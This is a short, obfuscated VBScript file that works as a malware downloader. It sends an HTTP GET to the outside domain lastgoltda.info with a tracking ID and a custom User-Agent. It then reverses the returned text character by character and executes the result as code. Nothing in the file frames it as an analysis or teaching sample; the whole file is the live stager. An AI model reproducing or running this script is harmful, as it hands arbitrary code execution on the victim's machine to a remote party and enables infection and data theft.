yamfW="O5gdxhC8Lfh6x2g49H88n1Xs1"
URL="http://lastgoltda.info/?c=v3&" & yamfW
set pjdcv=CreateObject("Microsoft.XMLHTTP")

pjdcv.open "GET",URL,false
pjdcv.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
pjdcv.setRequestHeader "User-Agent", "Joelton"
pjdcv.send "Z"

For i = Len(pjdcv.responsetext) to 1  Step-1
    var= Mid(pjdcv.responsetext,  i  , 1)
    JW2km = JW2km & var
Next

execute "Execute JW2km & yamfWpjdcv"
